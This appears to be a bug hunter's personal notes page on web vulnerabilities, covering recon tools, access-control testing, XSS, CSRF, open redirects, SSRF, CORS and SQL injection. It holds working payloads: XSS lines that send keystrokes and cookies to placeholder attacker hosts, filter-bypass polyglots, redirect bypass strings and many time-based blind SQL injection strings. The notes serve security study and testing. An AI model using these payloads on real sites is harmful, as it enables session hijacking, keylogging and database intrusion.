---
layout: single
classes: #wide
title: "Vulns"
sidebar:
    title: "Vulns"
    nav: infosec
collection: infopages
permalink: /infosec/vulns/
toc: true
toc_sticky: true
author_profile: true
---

monitors with ssl mate -> new subdomains new ssl cert see online and can start looking at it

# EMAIL - ryushe@bugcrowdninja-demon.com

# DNS
## DNS rebinding 
[blog](https://www.paloaltonetworks.com/cyberpedia/what-is-dns-rebinding)
* Attempts to bypass restrictions of SOP
1. register domain eg. `http://badsite.com` delegating site to personal controled dns
1. employee clicks on `http://badsite.com` 
1. dns controlled by bad actor sends correct ip to employees request with short TTL
    - dns sets the ttl policy
1. employee browser downloads page with malicious code binding to local ip of attackers dns
1. `http://badsite.com` now points to 60.6.6.60. Because ip is same origin attackers code can exfiltrate company information and sensitive data

# Domain Enumeration/recon
Amass - discovering subdomains & content    
- ex: `amass enum -brute -active -d domain.com -o amass-output.txt`  

httprobe - find working http & https servers    
- ex: `cat amass-output.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -c 50 | tee online-domains.txt `   

[anew](https://github.com/tomnomnom/anew) - see what domains might be new  
- ex: `cat new-output.txt | anew old-output.txt | httprobe`

dnsgen - through look thru of urls  
- ex: `cat amass-output.txt | dnsgen - | httprobe`  

aquatone - visual inspection (accepts endpoints and files as well as domains)  
- ex: `cat domains-endpoints.txt | aquatone`  

ffuf - fuzzing  

waybackmachine scanner - srapes /robots.txt for all doamins and scrape as many years as possible  
- url - [here](https://gist.github.com/mhmdiaa)
- after scan each endpoint with ffuf
- Scraping /robots.txt but also main homepage of each subdomain  

Param scanner - scraping each endpoint and searching for input names, ids and js params
- [input scanner]( https://github.com/zseano/InputScanner) - looks for `<input>` and scrapes names and id then try it as a peram  
- Link finder/parameth also good peram scanners  

Any changes - takes list of urls and regulary changes for new changes on page

# WAFs
## LEARN:   
everything about WAF from security perspective [here](https://github.com/0xInfection/Awesome-WAF)

# BAC (Broken Access Control)
BAC - When users can act ouside intended perms  

How to test for BAC:
- Black box: 
    - Map app (identifying all instances where app appears to be interacting with underlying os)
    - Understand how access control is implemented for each privilege level
    - Maniulate params that are potentially used to make ac decisions back end
    - Automate testing using extensions (ex: Autorize)
- White Box:
    - Reivew code to id how acess controls are implemented in app 
        - Violations of POLP
        - Weak/missing access control checks on functions/resources
        - Missint access control rules for POST, PUT, DELETE methods at the API level
        - Relying solely on client side input to perform access control decisions
    - Validate potential access control vulns on a running app

How to exploit BAC:   
- depends on type:
    - Usually just a matter of manipulated of vuln field peram

- Burp ext - autorize

3 types:   
- Veritcal Acess Control - restrict access to functions not available for other users in org
    - priv ladder
- Horizontal access control - enables different users to access similar resource types
    - Can only access own data (if same perms)
- Context dependent access control - restricts access to functionality and resources based on state of app/users interaction with it
    - ex: have to confirm before delete user
    - ex: Altering shopping cart post order

Horizontal Priv Esc - when attacker gains access to resources belonging to another user  
- IDORS

Vertical Priv Esc - attacker access to privileged functionality, not permitted to access    
- Isadmin=true? --> if true gets admin
- role=1? -> setting custom vars to gain admin perms
- `X-Original-URL` header - bypass url based ac
Access Control Vulns in Multi-Step Process
    - `X-Rewrite-URL` can do same
- /confirm -> /delete (deletes user)
- devs commonly asume can never call /delete manually so all ac on /confirm
- Possible to change method? `POST, GET, PUT, DELETE`
- is /endpt and /ENDPT the same? 
    - is it a pattern match?  - common on springboard
        - eg: /endpt.wahoo == /endpt
    - What about /admin/ vs /admin

Other:
- bypasssing control chekcs by modifying params in URL or HTML page
Accessing API with missing contorls on POST, PUT and DELETE methods
- Manipulating metadata (JWTs or cookies)
- Explotiing CORS misconfiguration allowing API access from unauthorized/untrusted origins
- Force brwosing to authenticated pages -> as unauth 

Terms:  
Session Management - id's which subsequent http requests are being made by each user  
- token/cookie (ex)

Areas to look for: 
1. /admin not protected just hidden
2. js file discloses admin endpoint
3. Can control decisions by submitting value
    - eg: ?admin=true or role=1
4. can get around controls by adding custom header
    - X-Original-URL: /admin/deleteUser
5. changing request type `GET, POST, PUT, DELETE` causes application to run request 
6. idors hehe
    - idor + improper storage of files (in this case files had guid in them)
    - sends the request but deoesnt show user??? www
    - idor -> source code contains cleartext passwords
    - idor -> easily named files that are cleartext
        - resend request with different filename and download file
7. steps of validation with incorrect ac's 
8. referers -> submitted in HTTP indicating which page initiated request
    - if referer == /admin request allowed 
        - works because request scanned to see if admin, if admin request allowed through
9. Location controls

Resources [link](https://www.youtube.com/watch?v=_jz5qFWhLcg&ab_channel=RanaKhalil)

# XSS
- `<img src=x onerror=alert(0)>`
- `?"></script><base%20c%3D=href%3Dhttps:\mysite>`
    - ex script to send back to site
- `'"-->`  
- [Payloads](https://github.com/payloadbox/xss-payload-list)
- Tools (not sure abou thte category test):
    - general [xssrapy](https://github.com/DanMcInerney/xsscrapy)
    - [brutexss](https://github.com/shawarkhanethicalhacker/BruteXSS-1)
    - DOM [blueclosure](https://www.blueclosure.com/) - paid
    - [KNOXSS](https://knoxss.me/?page_id=1974) - paid

## notes
- if has sink (place to exe) don't need script tag since program will call for us

## XSS WAF filter?
- yes - bad since xss most common to mitigate vuln
    - what else are they just filtering?
        - eg: SSRF? Filtering just internal ips?
    - shows overall security

### WAF Bypasses
- break up words for ex: `<sscriptcript>` -> `<script>` when script gets taken out
- encode (url / html)
- polgots - 0 idea what is
    - ex: `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e`

## Testing for XSS and filtering
1. testing different encoding - weird behavior?
- does single encoding or double encoding do anything?
    - encoding changes once sent may be finding
    - encoding is always defaulted to the same might be nothing
- Ghetto Bypass (encodings to try) - [here](https://d3adend.org/xss/ghettoBypass)
2. Reverse engineering the dev's thoughts 
    - why did they create this and where else could this filter be:
        - filtering full tags but not filtering `<script`
            - bypass: `<script src=//mysite.com?c=`
                - appending tag to parameter value within the html
        - blacklist of bad html tags?
            - maybe forgot to add `<svg>`
        - how does website handle encodings, file uploads
    - Testing for XSS flow:
        - how are non malicious html tags handled 
            - eg: `<h1>`
        - Incomplete tags?
            - eg: `<iframe src=//url.com/c=`
        - encodings?
        - blacklist?

XSS filter bypass - [here](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)

## POC
alerts and such blocked?  
simple: `console.log("exploit completed)` works

## post exploit payloads
* keylogger - `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`  
* execute js - `<script></script>`
* business logic - `<script>user.changeEmail('attacker@hacker.thm');</script>`
* Cookies - `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`


## types
* reflected - editing parameters to insert malicious code
    - places to check:
        - url file path
        - parameters in url query string
        - http headers
* stored - put into db / hosted on webstite 
    - places to check:
        - comments on blog
        - user profile info
        - web listings
* dom - js execution happens direclty in the browser without any new pages being loaded/data submitted to backend code
    - places to check:
        - code
    - how to test:
        - look in code for places attacker can have control over
            - eg: `window.location.x` perams
        - see how the places are handled and whether values are ever written to web page's dom or pased to unsafe js methods eg: `eval()`
    - dom = programming interface for HTML and XMS docs
        - represents page so taht programs can change doc structure/style/content
    - ex: js gets contents from the window.location.hash peram and writes onto page in the currently being viewed section
* blind - payload gets stored and executed (cant see it being ran)
    - testing - ensure payload has callback (tool: xss hunter express)
    - impact - attacker could make calls to attacker's website, revealing the
    staff portal URL, the staff member's cookies, and even the contents of the
    portal page that is being viewed. 
    - Now the attacker could potentially hijack the staff member's session and have access to the private portal.
    - ex: website contains  contact where you can message a member of staff 
        - not being checked for malicious code
        - messages -> support tickets for staff on priv portal

# CSRF
force user to do action on target website from your website (usually vial HTML form ) 
- eg: `<form action="/login" method="POST">`

Places to start:
- areas where should be secure
    - eg: updating account info

What did it do?:
- reflect changes but with SCRF error?
- info shown?

If an area has different protections? Why
- Different team
- old codebase
- different peram name

Common approach to security:
- devs check if referer is their website
    - if so execute
    - if not disreguard
- Issue - sometimes checks only if referer header is found if not, no checks are done
- Gets blank referer:
    - `<meta name="referrer" content="no-referrer" />`
    `<iframe src=”data:text/html;base64,form_code_here”>`
- Sometimes only check if domain is found in the referer
    - creating domain on personal site and visting may bypass
        - `https://www.yoursite.com/https://www.theirsite.com/`

Since CSRF enables us to make requests under another user, can we force a user to be charged?

# Open url redirects
Common in programs that use oauth with tokens and a redirect     

encode: & ? # / \  
- App will decode AFTER first redirect
- sometimes need to double encode

Could be dropped because of:
* too many redirects
* too many parameters

ex redirect:   
normal: `https://www.target.com/login?client_id=123&redirect_url=/sosecure`  
bad: `https://www.target.com/login?client_id=123&redirect_url=https://www.target.com/redirect?redirect=1&url=https://www.zseano.com/`
- this example leads to token being sent to zseano.com

## Keywords for redirection
```
goto
redirect
location
url
link
dest / destination
referer
forward
```

## Common issues
* Not ecoding values correctly
    - especially if target allows for /localRedirects

## Google searching for vuln endpoints
```
return, return_url, rUrl, cancelUrl, url, redirect, follow, goto, returnTo, returnUrl, r_url, history, goback, redirectTo, redirectUrl, redirUrl
```

## Is XSS possible?
- redirect -> Location: (not possible)
- redirect -> window.location: (test for js)

common bypass filters:  
```
java%0d%0ascript%0d%0a:alert(0)
j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
java%07script:prompt`0`
java%09scrip%07t:prompt`0`
jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
pjavascriptt:confirm`0`

```

## Payloads:
``` 
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
//yoururl.com
//theirsite@yoursite.com
/\/yoursite.com
https://yoursite.com%3F.theirsite.com/
https://yoursite.com%2523.theirsite.com/
https://yoursite?c=.theirsite.com/ (use # \ also)
//%2F/yoursite.com
////yoursite.com
https://theirsite.computer/
https://theirsite.com.mysite.com
/%0D/yoursite.com (Also try %09, %00, %0a, %07)
/%2F/yoururl.com
/%5Cyoururl.com
//google%E3%80%82com
```

# SSRF
In scope domain issueing request to an url/endpoint you have defined  
- Looking for API console (typically on dev docs page)
    - typically has freatures that take a url peram to execute code
- Test how handle redirects
- Setting up simple redirect script with XAMPP
    - NGROK to expose it
    - add sleep(time) - see if server hangs out
    - mayber filter only checking parameter value and not the redirect value
    - check if open redirect works
 
## Tools: 
- XAMPP - run php code locally 
- NGROK - public ip 

# Cross origin resource sharing (CORS)

## Server-generated ACAO header from client-specified Origin header
ex: receives request
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```  
responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

Access-Control-Allow-Credentials: true  
- states that requests can include cookies

Access-Control-Allow-Origin  
- means any domain can access resources from the vulnerable domain

# keep in mind
- Devs make mistakes  
- Stick to what you know and don't get overwhelmed
- recon recon recon

# SQLI 
```0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X

0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z

'XOR(if((select now()=sysdate()),sleep(10),0))XOR'Z

X'XOR(if(now()=sysdate(),//sleep(5)//,0))XOR'X

X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X

X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X

'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z

(SELECT(0)FROM(SELECT(SLEEP(6)))a)

'XOR(if(now()=sysdate(),sleep(5*5),0))OR'

'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'

(SELECT * FROM (SELECT(SLEEP(5)))a)

'%2b(select*from(select(sleep(5)))a)%2b'

CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END

');(SELECT 4564 FROM PG_SLEEP(5))--

["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23"]

DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20%27bar%27=%27bar

AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar

1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK

(select*from(select(sleep(20)))a)

'%2b(select*from(select(sleep(0)))a)%2b'

*'XOR(if(2=2,sleep(10),0))OR'
-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//

'+(select*from(select(if(1=1,sleep(20),false)))a)+'"

2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)

BENCHMARK(10000000,MD5(CHAR(116)))

'%2bbenchmark(10000000%2csha1(1))%2b'

'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20 - true

polyglots payloads:

if(now()=sysdate(),sleep(3),0)/'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"/

if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/```